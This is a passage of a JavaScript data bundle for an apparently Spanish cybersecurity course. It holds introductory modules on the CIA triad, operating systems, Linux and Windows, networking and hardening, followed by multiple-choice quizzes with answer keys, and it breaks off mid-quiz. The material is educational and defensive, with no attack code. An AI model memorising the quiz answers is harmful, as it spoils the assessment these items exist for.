/* CyberLab Embedded Datasets Bundle (CORS & Offline Proof) */
window.CyberData = {
  "modules": [
    {
      "id": "mod-01",
      "stage": 0,
      "title": "1. ¿Qué es la Ciberseguridad?",
      "category": "Fundamentos",
      "icon": "🛡️",
      "description": "Comprende los pilares fundamentales de la seguridad de la información, el modelo de amenazas y la tríada CIA.",
      "prerequisites": [],
      "estimatedTime": "30 min",
      "concepts": [
        {
          "id": "concept-cia",
          "name": "Tríada CIA (Confidencialidad, Integridad y Disponibilidad)",
          "summary": "El modelo fundamental para evaluar la seguridad de cualquier sistema de información.",
          "theory": "La Tríada CIA es el modelo sobre el cual se construyen todas las políticas de seguridad. \n- **Confidencialidad**: Garantiza que la información solo sea accesible por personal o sistemas autorizados. (Ej: Cifrado de datos, control de acceso).\n- **Integridad**: Garantiza que la información no haya sido alterada, manipulada o corrompida sin autorización. (Ej: Funciones Hash, firmas digitales).\n- **Disponibilidad**: Garantiza que los datos y servicios estén accesibles para usuarios autorizados cuando los necesiten. (Ej: Redundancia, respaldos, protección anti-DDoS).",
          "example": "Si un atacante roba tus contraseñas en texto claro, vulnera la Confidencialidad. Si modifica la cantidad de dinero en tu cuenta bancaria, vulnera la Integridad. Si tira el servidor de tu banco mediante una denegación de servicio, vulnera la Disponibilidad.",
          "practice": "Analiza tu red doméstica e identifica un control para cada elemento de la Tríada CIA (ej: WPA3 para confidencialidad, verificaciones de actualización para integridad, UPS para disponibilidad).",
          "defense": "Implementar principio de mínimo privilegio, cifrado en tránsito y reposo, respaldos offline (3-2-1) y monitoreo continuo.",
          "detection": "Alertas de integridad de archivos (FIM), detección de anomalías en tráfico de red e inspección de logs de autenticación.",
          "tags": [
            "#fundamentos",
            "#cia",
            "#conceptos"
          ],
          "resources": {
            "readings": [
              {
                "title": "OWASP: Security Fundamentals",
                "url": "https://devguide.owasp.org/es/02-foundations/01-security-fundamentals/"
              }
            ],
            "videos": [
              {
                "title": "Tríada CIA (Principal)",
                "url": "https://www.youtube.com/watch?v=j2JpaZmdBi8"
              },
              {
                "title": "Tríada CIA (Complemento con ejemplos)",
                "url": "https://www.youtube.com/watch?v=_6sraKIpFmU"
              }
            ]
          }
        },
        {
          "id": "concept-risk-threat",
          "name": "Riesgo, Amenaza, Vulnerabilidad y Exploit",
          "summary": "Diferenciación matemática y conceptual entre los componentes clave del análisis de seguridad.",
          "theory": "En ciberseguridad, confundir riesgo con amenaza es un error común:\n- **Amenaza (Threat)**: Cualquier factor externo o evento con el potencial de causar daño (ej: un grupo de ransomware, un terremoto).\n- **Vulnerabilidad (Vulnerability)**: Una debilidad o fallo en el diseño, implementación o configuración de un sistema.\n- **Exploit**: Una herramienta o secuencia de comandos diseñada para aprovechar una vulnerabilidad.\n- **Riesgo (Risk)**: La probabilidad de que una amenaza aproveche una vulnerabilidad multiplicada por el impacto del daño (`Riesgo = Amenaza × Vulnerabilidad × Impacto`).\n\n⭐ LO QUE DEBES DIFERENCIAR:\nAMENAZA\n   ↓\npuede aprovechar una\n   ↓\nVULNERABILIDAD\n   ↓\nmediante un\n   ↓\nEXPLOIT\n   ↓\nprovocando un\n   ↓\nIMPACTO / RIESGO",
          "example": "Imagina una puerta con la cerradura rota (Vulnerabilidad). Un ladrón en el barrio (Amenaza) puede usar una palanca (Exploit) para entrar. El Riesgo es la posibilidad de que roben tus objetos de valor.",
          "practice": "Calcula el riesgo de un servidor web obsoleto expuesto a Internet sin actualizaciones desde hace 2 años.",
          "defense": "Gestión activa de parches, escaneo periódico de vulnerabilidades y reducción de superficie de ataque.",
          "detection": "Scanners de vulnerabilidades (Nessus, OpenVAS) y feeds de inteligencia de amenazas (CTI).",
          "tags": [
            "#fundamentos",
            "#riesgo",
            "#vulnerabilidad"
          ],
          "resources": {
            "readings": [
              {
                "title": "OWASP: Security Fundamentals",
                "url": "https://devguide.owasp.org/es/02-foundations/01-security-fundamentals/"
              },
              {
                "title": "INCIBE",
                "url": "https://www.incibe.es/"
              },
              {
                "title": "OWASP Security Principles",
                "url": "https://devguide.owasp.org/es/02-foundations/03-security-principles/"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Riesgo, Amenaza, Vulnerabilidad y Exploit",
                "url": "https://www.youtube.com/results?search_query=riesgo+amenaza+vulnerabilidad+exploit+ciberseguridad+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-02",
      "stage": 0,
      "title": "2. ¿Cómo funciona un Computador?",
      "category": "Informática",
      "icon": "💻",
      "description": "Arquitectura interna, CPU, RAM, ciclo de instrucción, buses y estructura de procesos en memoria.",
      "prerequisites": [
        "mod-01"
      ],
      "estimatedTime": "45 min",
      "concepts": [
        {
          "id": "concept-cpu-ram",
          "name": "Arquitectura Hardware: CPU, RAM y Registro",
          "summary": "El corazón del procesamiento computacional y la distribución del espacio de direcciones.",
          "theory": "Un computador ejecuta instrucciones procesando datos en una jerarquía de memoria:\n1. **Registros CPU**: Celdas ultrarrápidas dentro del procesador (EAX/RAX, ESP/RSP, EIP/RIP).\n2. **Memoria RAM**: Memoria volátil de acceso aleatorio organizada en direcciones hexadecimales.\n3. **Almacenamiento (SSD/HDD)**: Persistencia de archivos en bloques de almacenamiento.\nEl ciclo de procesamiento sigue el flujo: **Fetch (Busca) → Decode (Decodifica) → Execute (Ejecuta) → Writeback (Escribe resultado)**.\n\n🎯 DEBES LLEGAR A ENTENDER:\nCPU\n ↓\nRegistros\n ↓\nCaché\n ↓\nRAM\n ↓\nSSD/HDD\n\n(Y entender por qué cada nivel tiene diferente velocidad, capacidad y función).",
          "example": "Cuando ejecutas un programa ejecutable (.exe o ELF), el Sistema Operativo carga las instrucciones del disco a la memoria RAM y asigna al registro EIP/RIP la dirección de la primera instrucción.",
          "practice": "Abre el Administrador de Tareas (Windows) o `top`/`htop` (Linux) y analiza cuánta RAM consume el proceso de tu navegador y cuántos hilos tiene asignados.",
          "defense": "Tecnologías a nivel de hardware como DEP (Data Execution Prevention / NX Bit) y ASLR (Address Space Layout Randomization).",
          "detection": "Monitoreo de inyección en procesos (Memory Injection Detection) y anomalías en uso de CPU por malware.",
          "tags": [
            "#hardware",
            "#cpu",
            "#ram",
            "#procesos"
          ],
          "resources": {
            "readings": [
              {
                "title": "Cisco NetAcad (IT Essentials)",
                "url": "https://www.netacad.com/es/catalogs/learn"
              },
              {
                "title": "OpenStax (Computer Science)",
                "url": "https://openstax.org/subjects/computer-science"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Arquitectura computador CPU RAM",
                "url": "https://www.youtube.com/results?search_query=arquitectura+computador+CPU+RAM+registros+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-03",
      "stage": 1,
      "title": "3. Sistemas Operativos",
      "category": "Sistemas",
      "icon": "⚙️",
      "description": "Funcionamiento interno del Kernel, modo usuario vs modo Kernel, llamadas al sistema (syscalls) y gestión de memoria.",
      "prerequisites": [
        "mod-02"
      ],
      "estimatedTime": "45 min",
      "concepts": [
        {
          "id": "concept-kernel-userland",
          "name": "Kernel vs Userland y System Calls",
          "summary": "La frontera de seguridad entre las aplicaciones de usuario y el hardware físico.",
          "theory": "Los procesadores modernos ejecutan código en niveles de privilegio (Rings):\n- **Ring 0 (Kernel Mode)**: Privilegio total. Controla el hardware, memoria y controladores.\n- **Ring 3 (User Mode)**: Modo restringido donde se ejecutan las aplicaciones de usuario.\nPara que una aplicación lea un archivo o abra una conexión de red, debe invocar una **System Call (syscall)** en Linux o una función API de `NTDLL.dll` en Windows.\n\n⭐ FLUJO CLAVE:\nProcesos → Kernel → System Calls\n\nEste subtema te ayudará muchísimo para comprender malware, procesos, permisos, memoria, archivos, escalada de privilegios y análisis de comportamiento.",
          "example": "En Python, al hacer `open('archivo.txt', 'r')`, el intérprete ejecuta la syscall `sys_openat` en el Kernel de Linux para validar tus permisos de archivo.",
          "practice": "Usa el comando `strace ls` en Linux para observar todas las llamadas al sistema que realiza el comando `ls` antes de mostrar los archivos.",
          "defense": "Restricción de controladores sin firma (Driver Signature Enforcement) y uso de contenedores con aislamiento de syscalls (seccomp).",
          "detection": "Auditoría de syscalls con `auditd` en Linux o Sysmon (Event ID 8 / CreateRemoteThread) en Windows.",
          "tags": [
            "#sistemas",
            "#kernel",
            "#syscalls"
          ],
          "resources": {
            "readings": [
              {
                "title": "Linux Kernel Documentation",
                "url": "https://docs.kernel.org/"
              },
              {
                "title": "Linux Documentation Project",
                "url": "https://tldp.org/"
              },
              {
                "title": "IBM: System Calls",
                "url": "https://www.ibm.com/docs/en/aix/7.2?topic=calls-system"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Kernel vs Userland y System Calls",
                "url": "https://www.youtube.com/results?search_query=kernel+userland+system+calls+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-04",
      "stage": 1,
      "title": "4. Linux Básico para Seguridad",
      "category": "Linux",
      "icon": "🐧",
      "description": "Dominio de la línea de comandos, sistema de archivos jerárquico, permisos Octales, usuarios y SSH.",
      "prerequisites": [
        "mod-03"
      ],
      "estimatedTime": "60 min",
      "concepts": [
        {
          "id": "concept-linux-permissions",
          "name": "Sistema de Archivos y Permisos Linux (chmod/chown)",
          "summary": "Gestión de permisos POSIX, bit SUID/SGID y navegación por el árbol de directorios.",
          "theory": "En Linux todo es un archivo. La estructura raíz `/` contiene directorios clave como `/etc` (configuración), `/var/log` (registros) y `/home` (usuarios).\nLos permisos se dividen en Propietario (u), Grupo (g) y Otros (o) con los valores:\n- Read (r) = 4\n- Write (w) = 2\n- Execute (x) = 1\nEjemplo: `chmod 755 script.sh` da rwx al dueño (7) y r-x al resto (5).\n\n⭐ Linux File Permissions:\nDebes terminar entendiendo:\n\nr = read\nw = write\nx = execute\n\ny los conceptos avanzados:\n- chmod\n- chown\n- sudo\n- SUID\n- SGID\n- Sticky Bit",
          "example": "El archivo `/etc/shadow` almacena los hashes de contraseñas y solo debe ser legible por el usuario `root` (`-rw-r----- root shadow`).",
          "practice": "Crea una carpeta de prueba, otorga permisos `700` con `chmod`, intenta acceder desde otro usuario no privilegiado y registra el resultado.",
          "defense": "Eliminar permisos SUID innecesarios (`find / -perm -4000 2>/dev/null`) y aplicar el principio de mínimo privilegio.",
          "detection": "Auditar modificaciones en `/etc/passwd` y `/etc/shadow` mediante alertas del sistema.",
          "tags": [
            "#linux",
            "#cli",
            "#permisos",
            "#chmod"
          ],
          "resources": {
            "readings": [
              {
                "title": "Ubuntu: Command line for beginners",
                "url": "https://ubuntu.com/tutorials/command-line-for-beginners"
              },
              {
                "title": "Linux Documentation Project",
                "url": "https://tldp.org/"
              },
              {
                "title": "GNU Coreutils Manual",
                "url": "https://www.gnu.org/software/coreutils/manual/coreutils.html"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Permisos Linux chmod chown SUID",
                "url": "https://www.youtube.com/results?search_query=permisos+Linux+chmod+chown+SUID+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-05",
      "stage": 1,
      "title": "5. Windows Básico y PowerShell",
      "category": "Windows",
      "icon": "🪟",
      "description": "Arquitectura de Windows, Registro del sistema, PowerShell cmdlets, Event Viewer y servicios.",
      "prerequisites": [
        "mod-03"
      ],
      "estimatedTime": "60 min",
      "concepts": [
        {
          "id": "concept-win-registry",
          "name": "El Registro de Windows y Persistencia",
          "summary": "Base de datos centralizada de configuración de Windows y su uso en auditoría y persistencia.",
          "theory": "El Registro de Windows almacena las configuraciones del sistema en colmenas (Hives) principales:\n- `HKLM` (HKEY_LOCAL_MACHINE): Configuración global del hardware y sistema.\n- `HKCU` (HKEY_CURRENT_USER): Configuración del usuario en sesión.\nLas claves `Run` y `RunOnce` son utilizadas frecuentemente por aplicaciones para ejecutarse al iniciar sesión.\n\n⭐ Mecanismos de persistencia de Windows:\nIdentificación y defensa. No solamente aprender cómo funcionan, sino cómo detectarlos y eliminarlos en un laboratorio.",
          "example": "Una aplicación maliciosa puede agregar un valor en `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` para ejecutarse automáticamente sin conocimiento del usuario.",
          "practice": "Abre PowerShell como Administrador y ejecuta `Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'` para inspeccionar las aplicaciones de inicio.",
          "defense": "Restringir permisos de escritura en claves del Registro usando Grupos de Directivas de Grupo (GPO).",
          "detection": "Sysmon Event ID 12 (RegistryEvent - Object create/delete) y Event ID 13 (RegistryEvent - Value Set).",
          "tags": [
            "#windows",
            "#powershell",
            "#registro",
            "#persistencia"
          ],
          "resources": {
            "readings": [
              {
                "title": "Microsoft Learn: Working with registry entries",
                "url": "https://learn.microsoft.com/es-es/powershell/scripting/samples/working-with-registry-entries?view=powershell-7.5"
              },
              {
                "title": "Registry Provider",
                "url": "https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_registry_provider?view=powershell-7.5"
              },
              {
                "title": "PowerShell Documentation",
                "url": "https://learn.microsoft.com/es-es/powershell/"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Registro de Windows regedit",
                "url": "https://www.youtube.com/results?search_query=registro+de+Windows+regedit+explicado+español"
              },
              {
                "title": "Búsqueda: PowerShell desde cero",
                "url": "https://www.youtube.com/results?search_query=PowerShell+desde+cero+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-06",
      "stage": 2,
      "title": "6. Redes y Telecomunicaciones",
      "category": "Redes",
      "icon": "🌐",
      "description": "Modelos OSI y TCP/IP, direccionamiento IPv4/IPv6, puertos, sockets y protocolo ARP.",
      "prerequisites": [
        "mod-01"
      ],
      "estimatedTime": "60 min",
      "concepts": [
        {
          "id": "concept-osi-tcp",
          "name": "Modelo OSI vs TCP/IP y Handshake de 3 Vías",
          "summary": "Cómo viajan los paquetes de datos a través de las capas de red y el establecimiento de conexiones TCP.",
          "theory": "El protocolo TCP es orientado a conexión y garantiza la entrega mediante el **TCP 3-Way Handshake**:\n1. **SYN**: El cliente envía un paquete con la bandera SYN y número de secuencia inicial.\n2. **SYN-ACK**: El servidor responde aceptando la conexión con SYN y confirmando con ACK.\n3. **ACK**: El cliente confirma la recepción y la conexión queda ESTABLISHED.\n\n⭐ THREE-WAY HANDSHAKE:\nCliente                    Servidor\n\nSYN       ────────────────>\n\n          <────────────── SYN + ACK\n\nACK       ────────────────>\n\n        CONEXIÓN ESTABLECIDA",
          "example": "Cuando conectas tu terminal SSH a un servidor remoto por el puerto 22, antes de enviar credenciales se ejecuta un 3-Way Handshake completo.",
          "practice": "Utiliza `ping` y `traceroute` (o `tracert` en Windows) hacia un dominio público y observa los saltos de red.",
          "defense": "Firewalls de inspección de estado (Stateful Inspection) y filtrado de paquetes en capa de red.",
          "detection": "Captura de paquetes con Wireshark/tcpdump buscando escaneos SYN de media apertura (SYN Flood).",
          "tags": [
            "#redes",
            "#tcp",
            "#osi",
            "#ports"
          ],
          "resources": {
            "readings": [
              {
                "title": "Microsoft: Three-way handshake",
                "url": "https://learn.microsoft.com/es-es/troubleshoot/windows-server/networking/three-way-handshake-via-tcpip"
              },
              {
                "title": "Cisco Networking Academy",
                "url": "https://www.netacad.com/es/catalogs/learn"
              }
            ],
            "videos": [
              {
                "title": "Modelo OSI vs TCP/IP (Visual)",
                "url": "https://www.youtube.com/watch?v=MqpIJLmMny8"
              },
              {
                "title": "Búsqueda: Three way handshake TCP",
                "url": "https://www.youtube.com/results?search_query=three+way+handshake+TCP+español"
              }
            ]
          }
        },
        {
          "id": "concept-subnetting",
          "name": "Direccionamiento IPv4 y Subnetting (Máscara CIDR)",
          "summary": "Cálculo de subredes, rangos de IP utilizables, Broadcast y división de redes.",
          "theory": "Una dirección IPv4 consta de 32 bits divididos en 4 octetos. La máscara de subred (ej: `255.255.255.0` o `/24`) separa la porción de red de la porción de hosts.\n- Para `/24`: 256 direcciones totales, 254 IPs utilizables (descontando Red y Broadcast).\n- Para `/28`: 16 direcciones totales, 14 IPs utilizables.",
          "example": "La IP `192.168.1.50/24` pertenece a la red `192.168.1.0`. Su dirección de Broadcast es `192.168.1.255` y sus IPs asignables van de `.1` a `.254`.",
          "practice": "Calcula el rango útil de la subred `10.0.0.0/27` e identifica su IP de Broadcast.\n\n⭐ EJERCICIOS PROGRESIVOS:\nPractica hacer subnetting progresivo para /24, /25, /26, /27, /28, /29, /30.\n\nDebes dominar: IP → máscara → red → broadcast → rango de hosts.\nEs obligatorio si después quieres aprender pentesting, firewalls o análisis de tráfico.",
          "defense": "Segmentación de redes mediante VLANs para evitar comunicaciones no autorizadas entre departamentos.",
          "detection": "Inspección de peticiones ARP anómalas que intenten cruzar segmentos de subred sin pasar por el router.",
          "tags": [
            "#redes",
            "#ipv4",
            "#subnetting",
            "#cidr"
          ],
          "resources": {
            "readings": [
              {
                "title": "Cisco Networking Academy",
                "url": "https://www.netacad.com/es/catalogs/learn"
              },
              {
                "title": "Cloudflare: What is a subnet?",
                "url": "https://www.cloudflare.com/es-es/learning/network-layer/what-is-a-subnet/"
              },
              {
                "title": "Herramienta: Subnet Calculator",
                "url": "https://www.subnet-calculator.org/"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Subnetting desde cero CIDR",
                "url": "https://www.youtube.com/results?search_query=subnetting+desde+cero+español+CIDR"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-07",
      "stage": 3,
      "title": "7. ¿Cómo funciona Internet?",
      "category": "Internet",
      "icon": "🌍",
      "description": "Análisis paso a paso de la resolución DNS, navegación HTTP/HTTPS, TLS y arquitectura Cliente-Servidor.",
      "prerequisites": [
        "mod-06"
      ],
      "estimatedTime": "50 min",
      "concepts": [
        {
          "id": "concept-dns-http",
          "name": "Resolución DNS y Negociación HTTPS (TLS Handshake)",
          "summary": "El viaje completo desde que escribes una URL en el navegador hasta que la página se despliega.",
          "theory": "Al ingresar `https://example.com` ocurren los siguientes pasos:\n1. **Consulta DNS**: El navegador consulta la caché local, resolver DNS y servidor raíz para traducir el dominio a una IP IPv4/IPv6.\n2. **Conexión TCP**: Handshake de 3 vías con la IP en puerto 443.\n3. **TLS Handshake**: Intercambio de certificados, negociación de algoritmos criptográficos y generación de clave simétrica de sesión.\n4. **Petición HTTP GET**: Solicitud del archivo `index.html` cifrada con la clave de sesión.\n\n⭐ ¿Qué ocurre cuando escribo https://google.com?\n\nURL\n ↓\nDNS\n ↓\nIP\n ↓\nTCP\n ↓\nTLS\n ↓\nHTTPS\n ↓\nServidor",
          "example": "El comando `dig example.com` realiza una consulta de registros DNS tipo A para obtener la IP del servidor.",
          "practice": "Abre las Herramientas de Desarrollador (F12) en tu navegador, ve a la pestaña 'Network' e inspecciona las cabeceras HTTP de respuesta.",
          "defense": "Implementación de DNSSEC para evitar envenenamiento de DNS y certificados TLS válidos emitidos por una AC de confianza.",
          "detection": "Monitoreo de peticiones DNS inusuales (DNS Tunneling o dominios DGA generados dinámicamente por malware).",
          "tags": [
            "#internet",
            "#dns",
            "#http",
            "#tls"
          ],
          "resources": {
            "readings": [
              {
                "title": "Cloudflare: ¿Qué es DNS?",
                "url": "https://www.cloudflare.com/es-es/learning/dns/what-is-dns/"
              },
              {
                "title": "MDN: HTTPS",
                "url": "https://developer.mozilla.org/es/docs/Glossary/HTTPS"
              },
              {
                "title": "Cloudflare: TLS",
                "url": "https://www.cloudflare.com/es-es/learning/ssl/transport-layer-security-tls/"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Cómo funciona DNS",
                "url": "https://www.youtube.com/results?search_query=DNS+como+funciona+español"
              },
              {
                "title": "Búsqueda: TLS handshake HTTPS",
                "url": "https://www.youtube.com/results?search_query=TLS+handshake+HTTPS+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-08",
      "stage": 4,
      "title": "8. Programación Orientada a Ciberseguridad",
      "category": "Programación",
      "icon": "🐍",
      "description": "Fundamentos de Python y Bash enfocados en la automatización de tareas, manejo de archivos y sockets de red.",
      "prerequisites": [
        "mod-04"
      ],
      "estimatedTime": "60 min",
      "concepts": [
        {
          "id": "concept-python-sockets",
          "name": "Manejo de Sockets y Automatización con Python",
          "summary": "Creación de scripts para interacción en red, consumo de APIs y análisis de texto.",
          "theory": "Python es el lenguaje preferido en ciberseguridad gracias a su simplicidad y librerías nativas como `socket`, `requests` y `os`.\nLa librería `socket` permite crear clientes y servidores TCP/UDP directamente interactuando con las capas del sistema operativo.\n\n⭐ AUTOMATIZACIÓN PARA CIBERSEGURIDAD:\n\nFlujo básico:\nPython → leer archivos → procesar logs → buscar patrones → generar reporte\n\nFlujo de red:\nPython → socket → IP + puerto → TCP",
          "example": "Un banner grabber sencillo en Python conecta a la IP y puerto especificado y lee la primera respuesta del servidor para identificar la versión del servicio.",
          "practice": "Escribe un script en Python que intente conectar al puerto 80 de `127.0.0.1` e imprima un mensaje según la conexión sea exitosa o rechazada.",
          "defense": "Revisión estática de código (SAST) para evitar la inyección de comandos o ejecución insegura de funciones como `eval()` o `exec()`.",
          "detection": "Análisis de comportamiento de scripts no firmados ejecutando sockets inusuales en máquinas de la red.",
          "tags": [
            "#python",
            "#sockets",
            "#programacion",
            "#scripting"
          ],
          "resources": {
            "readings": [
              {
                "title": "Python Docs: Sockets HOWTO",
                "url": "https://docs.python.org/es/3.13/howto/sockets.html"
              },
              {
                "title": "Python Docs: Módulo socket",
                "url": "https://docs.python.org/es/3/library/socket.html"
              },
              {
                "title": "Python Oficial Completo",
                "url": "https://docs.python.org/es/3/"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: Python desde cero",
                "url": "https://www.youtube.com/results?search_query=Python+desde+cero+español"
              },
              {
                "title": "Búsqueda: Sockets Python",
                "url": "https://www.youtube.com/results?search_query=Sockets+Python+español"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-09",
      "stage": 7,
      "title": "9. Seguridad Básica y Hardening",
      "category": "Seguridad",
      "icon": "🔒",
      "description": "Principios de defensa en profundidad, bastionado de sistemas (Hardening), autenticación MFA y contraseñas.",
      "prerequisites": [
        "mod-01",
        "mod-04",
        "mod-05"
      ],
      "estimatedTime": "45 min",
      "concepts": [
        {
          "id": "concept-hardening",
          "name": "Defensa en Profundidad y Bastionado (Hardening)",
          "summary": "Estrategia multicapa para reducir la superficie de ataque en sistemas y redes.",
          "theory": "La **Defensa en Profundidad** establece que ningún control de seguridad es infalible por sí solo. Se aplican capas superpuestas:\n1. Seguridad Física\n2. Perímetro / Red\n3. Endpoint / Host\n4. Aplicación\n5. Datos / Criptografía\nEl **Hardening** implica deshabilitar servicios innecesarios, aplicar parches, cambiar credenciales por defecto y configurar reglas estricta de firewall.\n\n⭐ CONCEPTOS ADICIONALES A DOMINAR:\n- Mínimo privilegio\n- Configuración segura por defecto\n- Reducción de superficie de ataque\n- Actualización de software\n- Firewall\n- Usuarios y permisos\n- Backups\n- Logging\n- Defensa en profundidad",
          "example": "Deshabilitar el protocolo SMBv1 en Windows es una medida de Hardening crucial para prevenir ataques del tipo WannaCry.",
          "practice": "Inspecciona los servicios activos en tu sistema operativo y deshabilita aquellos que no utilices.",
          "defense": "Uso de plantillas de seguridad reconocidas internacionalmente como CIS Benchmarks (Center for Internet Security).",
          "detection": "Auditoría periódica de configuraciones de seguridad mediante scripts de compliance audit.",
          "tags": [
            "#seguridad",
            "#hardening",
            "#defensa",
            "#mfa"
          ],
          "resources": {
            "readings": [
              {
                "title": "OWASP Security Principles",
                "url": "https://devguide.owasp.org/es/02-foundations/03-security-principles/"
              },
              {
                "title": "CIS Controls",
                "url": "https://www.cisecurity.org/controls"
              }
            ],
            "videos": [
              {
                "title": "INCIBE: Hardening Básico Linux",
                "url": "https://www.youtube.com/watch?v=YZnkAWdXB4s"
              },
              {
                "title": "Aprende IT: Hardening del kernel Linux",
                "url": "https://www.youtube.com/watch?v=Os3STDgN2ZA"
              }
            ]
          }
        }
      ]
    },
    {
      "id": "mod-10",
      "stage": 11,
      "title": "10. Primer Laboratorio Educativo",
      "category": "Laboratorios",
      "icon": "🧪",
      "description": "Aplicación integrada de conocimientos: Análisis de paquetes, identificación de servicios y respuesta guiada.",
      "prerequisites": [
        "mod-06",
        "mod-07",
        "mod-08"
      ],
      "estimatedTime": "60 min",
      "concepts": [
        {
          "id": "concept-first-lab",
          "name": "Metodología de Análisis en Laboratorio Seguro",
          "summary": "Protocolo para investigar artefactos, realizar capturas de tráfico y documentar hallazgos de forma ética.",
          "theory": "Todos los experimentos prácticos deben realizarse en entornos controlados y aislados (como máquinas virtuales en Host-Only o entornos deliberadamente vulnerables).\nEl flujo de investigación comprende:\n1. Definición del objetivo\n2. Captura de datos (Logs / PCAP)\n3. Análisis e interpretación\n4. Formulación de remediaciones y mitigación.",
          "example": "Analizar un archivo `.pcap` en Wireshark filtrando por `http.request.method == 'POST'` para identificar intentos de envío de datos sensibles.",
          "practice": "Completa el Laboratorio Lab-001 disponible en la sección 'CyberLabs' de esta plataforma.\n\n🔥 IMPORTANTE: METODOLOGÍA PRÁCTICA\nConvierte cada tema en el siguiente ciclo:\n📖 Lectura → 🎥 Video → 🧠 Quiz → 💻 Ejercicio → 🧪 Laboratorio → 📝 Evaluación\n\nEjemplo: Tras estudiar TCP/IP, no pases al siguiente módulo. Haz un laboratorio con Wireshark o Packet Tracer para observar los paquetes reales y asimilar el conocimiento.",
          "defense": "Aislamiento total de red y segmentación en hipervisores (VirtualBox/VMware) antes de ejecutar pruebas.",
          "detection": "Auditoría de integridad de red y registro de logs centralizado en laboratorio.",
          "tags": [
            "#laboratorio",
            "#practica",
            "#analisis",
            "#ethicallab"
          ],
          "resources": {
            "readings": [
              {
                "title": "TryHackMe",
                "url": "https://tryhackme.com/"
              },
              {
                "title": "TryHackMe Paths",
                "url": "https://tryhackme.com/paths"
              },
              {
                "title": "OWASP Foundations",
                "url": "https://devguide.owasp.org/es/02-foundations/"
              },
              {
                "title": "Cisco Networking Academy",
                "url": "https://www.netacad.com/es/"
              },
              {
                "title": "PortSwigger Web Security Academy",
                "url": "https://portswigger.net/web-security"
              },
              {
                "title": "Wireshark",
                "url": "https://www.wireshark.org/"
              },
              {
                "title": "Cisco Packet Tracer",
                "url": "https://www.netacad.com/courses/packet-tracer"
              }
            ],
            "videos": [
              {
                "title": "Búsqueda: TryHackMe desde cero",
                "url": "https://www.youtube.com/results?search_query=TryHackMe+desde+cero+español"
              }
            ]
          }
        }
      ]
    }
  ],
  "quizzes": [
    {
      "id": "q-01",
      "moduleId": "mod-01",
      "category": "Fundamentos",
      "difficulty": "Básica",
      "question": "¿Qué pilar de la Tríada CIA se vulnera cuando un atacante realiza un ataque DDoS que satura un servidor web y lo deja inalcanzable?",
      "options": [
        "Confidencialidad",
        "Integridad",
        "Disponibilidad",
        "No Repudio"
      ],
      "answer": 2,
      "explanation": "Los ataques DDoS saturan la capacidad de procesamiento o ancho de banda del servidor, impidiendo que los usuarios autorizados accedan al servicio, afectando directamente la Disponibilidad."
    },
    {
      "id": "q-02",
      "moduleId": "mod-01",
      "category": "Fundamentos",
      "difficulty": "Básica",
      "question": "En el modelo de análisis de seguridad, ¿cuál es la fórmula conceptual del Riesgo?",
      "options": [
        "Riesgo = Amenaza + Vulnerabilidad",
        "Riesgo = Amenaza × Vulnerabilidad × Impacto",
        "Riesgo = Exploit / Amenaza",
        "Riesgo = Vulnerabilidad × Contraseña"
      ],
      "answer": 1,
      "explanation": "El Riesgo es el producto de la probabilidad de que una amenaza aproveche una vulnerabilidad multiplicada por el impacto económico u operativo que causaría."
    },
    {
      "id": "q-03",
      "moduleId": "mod-01",
      "category": "Fundamentos",
      "difficulty": "Intermedia",
      "question": "Un atacante modifica de forma no autorizada un valor en la base de datos de saldos bancarios. ¿Qué elemento de la Tríada CIA fue alterado?",
      "options": [
        "Confidencialidad",
        "Integridad",
        "Disponibilidad",
        "Autenticación"
      ],
      "answer": 1,
      "explanation": "La Integridad garantiza que la información se mantenga exacta y no sea modificada ni corrompida por entes no autorizados."
    },
    {
      "id": "q-04",
      "moduleId": "mod-02",
      "category": "Informática",
      "difficulty": "Básica",
      "question": "¿Cuál es la función del registro de procesador EIP (en x86) o RIP (en x64)?",
      "options": [
        "Almacenar el resultado de la última operación aritmética",
        "Apuntar a la siguiente instrucción a ser ejecutada en la memoria",
        "Guardar el puntero de la pila (Stack Pointer)",
        "Controlar la temperatura de la CPU"
      ],
      "answer": 1,
      "explanation": "El Instruction Pointer (EIP/RIP) contiene la dirección de memoria de la siguiente instrucción que el procesador debe decodificar y ejecutar."
    },
    {
      "id": "q-05",
      "moduleId": "mod-02",
      "category": "Informática",
      "difficulty": "Intermedia",
      "question": "¿Qué tecnología a nivel de hardware/OS evita que un procesador ejecute código ubicado en regiones de memoria marcadas solo para datos (como el Stack)?",
      "options": [
        "ASLR",
        "DEP / NX Bit",
        "ECC RAM",
        "RAID 5"
      ],
      "answer": 1,
      "explanation": "DEP (Data Execution Prevention) o el bit NX (No-Execute) marca ciertas regiones de memoria como no ejecutables para mitigar vulnerabilidades de desbordamiento de búfer (Buffer Overflow)."
    },
    {
      "id": "q-06",
      "moduleId": "mod-03",
      "category": "Sistemas",
      "difficulty": "Intermedia",
      "question": "¿En qué nivel de privilegio (Ring) del procesador se ejecuta el Kernel del Sistema Operativo?",
      "options": [
        "Ring 3",
        "Ring 1",
        "Ring 0",
        "Ring 7"
      ],
      "answer": 2,
      "explanation": "Ring 0 representa el modo Kernel con máxima autoridad y acceso directo al hardware físico de la máquina."
    },
    {
      "id": "q-07",
      "moduleId": "mod-03",
      "category": "Sistemas",
      "difficulty": "Básica",
      "question": "¿Cómo se le llama al mecanismo mediante el cual un programa de usuario solicita un servicio al Kernel del sistema operativo?",
      "options": [
        "Interrupt Service",
        "System Call (Syscall)",
        "Socket Bind",
        "User Trap"
      ],
